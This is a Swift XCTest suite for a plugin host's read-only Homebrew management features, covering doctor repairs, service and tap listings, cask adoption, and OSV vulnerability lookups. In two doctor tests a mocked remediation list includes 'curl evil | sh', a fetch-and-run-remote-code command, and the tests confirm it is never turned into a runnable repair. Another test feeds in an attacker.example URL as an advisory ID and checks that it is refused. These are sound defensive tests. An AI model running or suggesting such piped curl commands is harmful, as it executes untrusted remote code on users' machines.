import XCTest
import SpinnetCore
import SpinnetPluginTestKit

final class HomebrewManagementReadTests: XCTestCase {
    func testVersionReadReturnsTypedAvailabilityWithoutStartingAMutation() throws {
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, arguments, _, _ in
            XCTAssertEqual(arguments, ["--version"])
            return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8))
        })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("version")]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/version"), .string("7.0.0"))
        XCTAssertEqual(result.value(atPointer: "/features/vulnerabilities"), .bool(true))
    }
}

extension HomebrewManagementReadTests {
    func testServicesReadOnlyShowsCurrentUsersServicesWithoutFileOrAccountLeakage() throws {
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            XCTAssertEqual(args, ["services", "list", "--json"])
            return HomebrewReadOutput(status: 0, stdout: Data("""
            [{"name":"postgresql@17","status":"started","user":"\(NSUserName())","file":"/private/user/launch.plist"},
            {"name":"root-service","status":"started","user":"root","file":"/Library/LaunchDaemons/root.plist"}]
            """.utf8))
        })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("services")]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/services/0/name"), .string("postgresql@17"))
        XCTAssertNil(result.value(atPointer: "/services/1"))
        XCTAssertNil(result.value(atPointer: "/services/0/file"))
        XCTAssertNil(result.value(atPointer: "/services/0/user"))
    }
}

extension HomebrewManagementReadTests {
    func testTapStatusNeverAssumesAnOfficialNameImpliesTrust() throws {
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            XCTAssertEqual(args, ["tap-info", "--installed", "--json=v1"])
            return HomebrewReadOutput(status: 0, stdout: Data(#"[{"name":"homebrew/core","official":true,"trusted":false,"remote":"https://github.com/changed/source","formula_names":["wget"],"cask_tokens":[]}]"#.utf8))
        })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("taps")]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/taps/0/trusted"), .bool(false))
        XCTAssertEqual(result.value(atPointer: "/taps/0/formula_count"), .number(1))
    }
}

extension HomebrewManagementReadTests {
    func testDoctorOnlyIssuesReviewedRepairTargetsAndKeepsUnknownCommandsForCopy() throws {
        let targets = HomebrewManagementTargets()
        let management = HomebrewManagementReads(targets: targets)
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            XCTAssertEqual(args, ["doctor", "--json"])
            return HomebrewReadOutput(status: 1, stdout: Data(#"{"tier":2,"findings":[{"text":"Unlinked kegs","links":[],"remediation":{"commands":["brew link wget","curl evil | sh"]}}]}"#.utf8))
        }, management: management)
        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("doctor")])
        let result = try profile.read(input, owner: PluginID("management"))
        let target = try XCTUnwrap(result.value(atPointer: "/findings/0/repairs/0/target"))
        guard case .string(let key) = target else { return XCTFail("Opaque repair target missing") }
        XCTAssertEqual(try targets.resolve(target: key, owner: PluginID("management")).arguments, ["link", "--formula", "--", "wget"])
        XCTAssertThrowsError(try targets.resolve(target: key, owner: PluginID("other")))
        XCTAssertEqual(result.value(atPointer: "/findings/0/commands/1"), .string("curl evil | sh"))
        XCTAssertNil(result.value(atPointer: "/findings/0/repairs/1"))
        _ = try profile.read(input, owner: PluginID("management"))
        XCTAssertFalse(targets.isCurrent(target: key, owner: PluginID("management")))
    }
}

extension HomebrewManagementReadTests {
    func testAdoptionPreviewBindsConcreteAppAndRefusesAnAppChangedAfterReview() throws {
        let targets = HomebrewManagementTargets()
        var app = HomebrewAdoptionApplication(url: URL(fileURLWithPath: "/Applications/Example.app"), name: "Example", bundleID: "org.example.app", version: "2.0", fingerprint: "reviewed")
        let management = HomebrewManagementReads(targets: targets, applications: { [app] })
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            if args == ["search", "--cask", "--", "/(example)/"] { return HomebrewReadOutput(status: 0, stdout: Data("example\n".utf8)) }
            XCTAssertEqual(args, ["info", "--json=v2", "--cask", "--", "example"])
            return HomebrewReadOutput(status: 0, stdout: Data(#"{"formulae":[],"casks":[{"token":"example","version":"2.0","installed":null,"artifacts":[{"app":["Example.app"]}]}]}"#.utf8))
        }, management: management)
        let candidates = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("adoptionCandidates")]), owner: PluginID("management"))
        guard case .string(let candidate)? = candidates.value(atPointer: "/applications/0/target") else { return XCTFail("Missing native target") }
        let preview = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("adoptionPreview"), "target": .string(candidate), "name": .string("example")]), owner: PluginID("management"))
        guard case .string(let key)? = preview.value(atPointer: "/target") else { return XCTFail("Missing review target") }
        let target = try targets.resolve(target: key, owner: PluginID("management"))
        XCTAssertEqual(target.arguments, ["install", "--cask", "--adopt", "--", "example"])
        XCTAssertEqual(target.metadata.value(atPointer: "/adopt"), .bool(true))
        app = HomebrewAdoptionApplication(url: app.url, name: app.name, bundleID: app.bundleID, version: "3.0", fingerprint: "changed")
        XCTAssertFalse(targets.isCurrent(target: key, owner: PluginID("management")))
    }
}

extension HomebrewManagementReadTests {
    func testLocalPreviewNamesItsEstimateAndReportsDependenciesWithoutInstallArgv() throws {
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            XCTAssertEqual(args, ["info", "--json=v2", "--formula", "--", "wget"])
            return HomebrewReadOutput(status: 0, stdout: Data(#"{"formulae":[{"name":"wget","full_name":"wget","versions":{"stable":"1.25"},"dependencies":["libidn2","openssl@3"],"installed":[]}],"casks":[]}"#.utf8))
        })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("previewInstall"), "kind": .string("formula"), "names": .array([.string("wget")])]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/estimated"), .bool(true))
        XCTAssertEqual(result.value(atPointer: "/packages/0/dependencies/1"), .string("openssl@3"))
    }
}

private struct ManagementMetadataTransport: HTTPSTransport {
    let reply: (HTTPSTransportRequest) throws -> HTTPSTransportResponse
    func send(_ request: HTTPSTransportRequest) throws -> HTTPSTransportResponse { try reply(request) }
}
extension HomebrewManagementReadTests {
    func testAdvisoryDetailUsesOnlyReviewedOSVURLAndRetainsUsefulBoundedDetail() throws {
        let network = ManagementMetadataTransport { request in
            XCTAssertEqual(request.url.absoluteString, "https://api.osv.dev/v1/vulns/CVE-2026-1234")
            XCTAssertEqual(request.maximumResponseBytes, 128 * 1024)
            return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"id":"CVE-2026-1234","summary":"Example advisory","details":"Upgrade the affected library","database_specific":{"severity":"HIGH"},"affected":[{"ranges":[{"events":[{"introduced":"1.0"},{"fixed":"2.0"}]}]}],"references":[{"url":"https://example.org/advisory"}]}"#.utf8))
        }
        let management = HomebrewManagementReads(transport: network)
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            XCTAssertEqual(args, ["--version"])
            return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8))
        }, management: management)
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("vulnerabilityDetail"), "id": .string("CVE-2026-1234")]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/advisory/details"), .string("Upgrade the affected library"))
        XCTAssertEqual(result.value(atPointer: "/advisory/fixed_versions/0"), .string("2.0"))
    }
}

extension HomebrewManagementReadTests {
    func testFreshVulnerabilityReadQueriesInstalledSBOMVersionNotCurrentRecipe() throws {
        let prefix = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        let path = prefix.appendingPathComponent("Cellar/example/1.0/sbom.spdx.json")
        try FileManager.default.createDirectory(at: path.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(#"{"packages":[{"SPDXID":"SPDXRef-Archive-example-src","downloadLocation":"https://github.com/example/project/archive/refs/tags/v1.0.tar.gz","versionInfo":"1.0"}]}"#.utf8).write(to: path)
        defer { try? FileManager.default.removeItem(at: prefix) }
        let network = ManagementMetadataTransport { request in
            if request.url.path == "/v1/querybatch" {
                let body = try JSONDecoder().decode(JSONValue.self, from: XCTUnwrap(request.body))
                XCTAssertEqual(body.value(atPointer: "/queries/0/version"), .string("v1.0"))
                XCTAssertEqual(body.value(atPointer: "/queries/0/package/name"), .string("https://github.com/example/project"))
                return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"results":[{"vulns":[{"id":"CVE-2026-1234"}]}]}"#.utf8))
            }
            return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"id":"CVE-2026-1234","summary":"Installed version affected","affected":[{"ranges":[{"events":[{"fixed":"2.0"}]}]}]}"#.utf8))
        }
        let management = HomebrewManagementReads(transport: network)
        let profile = HomebrewReadProfile(executable: { prefix.appendingPathComponent("bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            if args == ["list", "--formula", "--versions"] { return HomebrewReadOutput(status: 0, stdout: Data("example 1.0\n".utf8)) }
            XCTAssertEqual(args, ["info", "--json=v2", "--formula", "--", "example"])
            return HomebrewReadOutput(status: 0, stdout: Data(#"{"formulae":[{"name":"example","versions":{"stable":"2.0"},"revision":0,"patches":[],"outdated":true,"pinned":false}]}"#.utf8))
        }, management: management)
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("vulnerabilities")]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/checked"), .number(1))
        XCTAssertEqual(result.value(atPointer: "/findings/0/installed_version"), .string("1.0"))
        XCTAssertEqual(result.value(atPointer: "/findings/0/advisories/0/fixed_versions/0"), .string("2.0"))
    }
}

extension HomebrewManagementReadTests {
    func testGHSAAdvisoryIDsWithLowercaseComponentsAreAcceptedButURLsAreRefused() throws {
        let network = ManagementMetadataTransport { request in
            XCTAssertEqual(request.url.path, "/v1/vulns/GHSA-vqj2-4v8m-8vrq")
            return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"id":"GHSA-vqj2-4v8m-8vrq","summary":"Known advisory"}"#.utf8))
        }
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, _, _, _ in
            HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8))
        }, management: HomebrewManagementReads(transport: network))
        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("vulnerabilityDetail"), "id": .string("GHSA-vqj2-4v8m-8vrq")])
        XCTAssertEqual(try profile.read(input, owner: PluginID("management")).value(atPointer: "/advisory/id"), .string("GHSA-vqj2-4v8m-8vrq"))
        XCTAssertThrowsError(try HomebrewReadInput(.object(["tool": .string("homebrew"), "operation": .string("vulnerabilityDetail"), "id": .string("https://attacker.example/advisory")])))
    }
}

extension HomebrewManagementReadTests {
    func testPublishedManagementFixturesEnforceTypedInputsAndResults() throws {
        let api = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent().appendingPathComponent("PluginAPI")
        struct Entry: Decodable { let file: String; let definition: String; let valid: Bool }
        struct Index: Decodable { let fixtures: [Entry] }
        let folder = api.appendingPathComponent("fixtures/homebrew-management")
        for entry in try JSONDecoder().decode(Index.self, from: Data(contentsOf: folder.appendingPathComponent("index.json"))).fixtures {
            let validator = try JSONSchemaSubsetValidator(definition: entry.definition, inSchemaAt: api.appendingPathComponent("schemas/homebrew-management-reads.schema.json"))
            let value = try JSONDecoder().decode(JSONValue.self, from: Data(contentsOf: folder.appendingPathComponent(entry.file)))
            XCTAssertEqual(validator.errors(for: value).isEmpty, entry.valid, entry.file)
        }
    }
}

extension HomebrewManagementReadTests {
    func testCancellingRemoteReadRefusesItsLateMetadataAnswer() throws {
        let cancellation = HostFetchedSections.Cancellation()
        let network = ManagementMetadataTransport { _ in
            cancellation.cancel()
            return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"id":"CVE-2023-38545"}"#.utf8))
        }
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, _, _, _ in
            HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8))
        }, management: HomebrewManagementReads(transport: network))
        XCTAssertThrowsError(try profile.read(.object(["tool": .string("homebrew"), "operation": .string("vulnerabilityDetail"), "id": .string("CVE-2023-38545")]), owner: PluginID("management"), cancellation: cancellation)) { error in
            XCTAssertEqual(error as? PluginHostServiceError, .unavailable("The reviewed read was cancelled"))
        }
    }
}

extension HomebrewManagementReadTests {
    func testNewManagementSourceRunsThroughRealHelperAndRecordedHostBoundary() throws {
        let root = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
        let directory = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString + ".spinnetplugin")
        defer { try? FileManager.default.removeItem(at: directory) }
        try FileManager.default.copyItem(at: root.appendingPathComponent("Tests/Fixtures/ReviewedToolsProbe.spinnetplugin"), to: directory)
        let manifestURL = directory.appendingPathComponent("manifest.json")
        let original = try String(contentsOf: manifestURL).replacingOccurrences(of: "\"installed\",\"outdated\",\"search\",\"info\"", with: "\"version\"")
        try original.write(to: manifestURL, atomically: true, encoding: .utf8)
        try """
        spinnet.ui.showPage(spinnet.ui.page({id:"management",title:"Homebrew",sources:[spinnet.tools.read.source("brew",{tool:"homebrew",operation:"version"})],content:[spinnet.ui.components.text({id:"version",text:"Waiting",bind:spinnet.ui.components.bind("brew","/version")})]}))
        """.write(to: directory.appendingPathComponent("read.js"), atomically: true, encoding: .utf8)
        let plugin = try PluginUnderTest(packageAt: directory)
        let helper = try PluginTestHelper(); defer { helper.shutdown() }
        let invocation = PluginTestInvocation("probe.read")
        let page = try XCTUnwrap(try helper.run(invocation, of: plugin, answering: RecordedHostServices()).answer().description)
        let source = try RecordedHostSources(of: plugin, for: invocation, operations: ["tools.read": .value(.object(["tool": .string("homebrew"), "operation": .string("version"), "version": .string("7.0.0")]))])
        try source.present(page); source.setVisible(true)
        XCTAssertEqual(source.shown("version")?.text, "7.0.0")
        source.close()
    }
}

extension HomebrewManagementReadTests {
    func testDoctorFixAllFreezesOnlyReviewedRepairsAndExpiresWithReport() throws {
        let targets = HomebrewManagementTargets()
        let management = HomebrewManagementReads(targets: targets)
        let owner = PluginID("management")
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            return HomebrewReadOutput(status: 1, stdout: Data(#"{"tier":2,"findings":[{"text":"Repairs","remediation":{"commands":["brew link wget","brew cleanup","curl evil | sh","brew link wget"]}}]}"#.utf8))
        }, management: management)
        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("doctor")])
        let result = try profile.read(input, owner: owner)
        guard case .string(let key)? = result.value(atPointer: "/fix_all/target") else { return XCTFail("Missing reviewed repair set") }
        XCTAssertEqual(result.value(atPointer: "/fix_all/count"), .number(2))
        let batch = try targets.resolve(target: key, owner: owner)
        XCTAssertEqual(batch.metadata.value(atPointer: "/doctor_steps/0/input/operation"), .string("link"))
        XCTAssertEqual(batch.metadata.value(atPointer: "/doctor_steps/1/input/operation"), .string("cleanup"))
        XCTAssertNil(batch.metadata.value(atPointer: "/doctor_steps/2"))
        _ = try profile.read(input, owner: owner)
        XCTAssertFalse(targets.isCurrent(target: key, owner: owner))
    }
}

extension HomebrewManagementReadTests {
    func testVulnerabilitiesSeparateInstalledRecipePatchesFromOlderKegs() throws {
        let prefix = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        defer { try? FileManager.default.removeItem(at: prefix) }
        for version in ["1.0", "2.0_1"] {
            let path = prefix.appendingPathComponent("Cellar/example/" + version + "/sbom.spdx.json")
            try FileManager.default.createDirectory(at: path.deletingLastPathComponent(), withIntermediateDirectories: true)
            try Data(#"{"packages":[{"SPDXID":"SPDXRef-Archive-example-src","downloadLocation":"https://github.com/example/project/archive/refs/tags/v1.0.tar.gz","versionInfo":"1.0"}]}"#.utf8).write(to: path)
        }
        let network = ManagementMetadataTransport { request in
            if request.url.path == "/v1/querybatch" { return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"results":[{"vulns":[{"id":"GHSA-abcd-1234-5678"}]}]}"#.utf8)) }
            return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"id":"GHSA-abcd-1234-5678","aliases":["CVE-2026-1234"],"summary":"Patched issue"}"#.utf8))
        }
        var installedVersion = "2.0_1"
        let profile = HomebrewReadProfile(executable: { prefix.appendingPathComponent("bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            if args == ["list", "--formula", "--versions"] { return HomebrewReadOutput(status: 0, stdout: Data("example \(installedVersion)\n".utf8)) }
            XCTAssertEqual(args, ["info", "--json=v2", "--formula", "--", "example"])
            return HomebrewReadOutput(status: 0, stdout: Data(#"{"formulae":[{"name":"example","versions":{"stable":"2.0"},"revision":1,"outdated":true,"pinned":false,"patches":[{"resolves":[{"type":"security","id":"CVE-2026-1234"}]}]}],"casks":[]}"#.utf8))
        }, management: HomebrewManagementReads(transport: network))
        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("vulnerabilities")])
        let current = try profile.read(input, owner: PluginID("security"))
        XCTAssertEqual(current.value(atPointer: "/findings/0/advisories/0/status"), .string("patched"))
        XCTAssertEqual(current.value(atPointer: "/findings/0/patched_count"), .number(1))
        installedVersion = "1.0"
        let older = try profile.read(input, owner: PluginID("security"))
        XCTAssertEqual(older.value(atPointer: "/findings/0/advisories/0/status"), .string("open"))
        XCTAssertEqual(older.value(atPointer: "/findings/0/upgrade_available"), .bool(true))
    }
}

extension HomebrewManagementReadTests {
    func testAdoptionCandidatesAutomaticallyMatchBoundedCasksAndExposeConfidenceWithoutPaths() throws {
        let apps = [HomebrewAdoptionApplication(url: URL(fileURLWithPath: "/Applications/Example.app"), name: "Example", bundleID: "org.example.app", version: "2.0", fingerprint: "current"), HomebrewAdoptionApplication(url: URL(fileURLWithPath: "/Applications/Old.app"), name: "Old", bundleID: "org.old.app", version: "1.0", fingerprint: "old")]
        let management = HomebrewManagementReads(targets: HomebrewManagementTargets(), applications: { apps })
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            if args.first == "search" { return HomebrewReadOutput(status: 0, stdout: Data("example\nold\n".utf8)) }
            XCTAssertEqual(args, ["info", "--json=v2", "--cask", "--", "example", "old"])
            return HomebrewReadOutput(status: 0, stdout: Data(#"{"casks":[{"token":"example","version":"2.0","installed":null,"artifacts":[{"app":["Example.app"]},{"uninstall":[{"quit":"org.example.app"}]}]},{"token":"old","version":"2.0","installed":null,"artifacts":[{"app":["Old.app"]}]}]}"#.utf8))
        }, management: management)
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("adoptionCandidates")]), owner: PluginID("adoption"))
        XCTAssertEqual(result.value(atPointer: "/applications/0/candidates/0/name"), .string("example"))
        XCTAssertEqual(result.value(atPointer: "/applications/0/candidates/0/confidence"), .string("ready"))
        XCTAssertEqual(result.value(atPointer: "/applications/1/candidates/0/confidence"), .string("cannot"))
        XCTAssertNil(result.value(atPointer: "/applications/0/path"))
    }
}
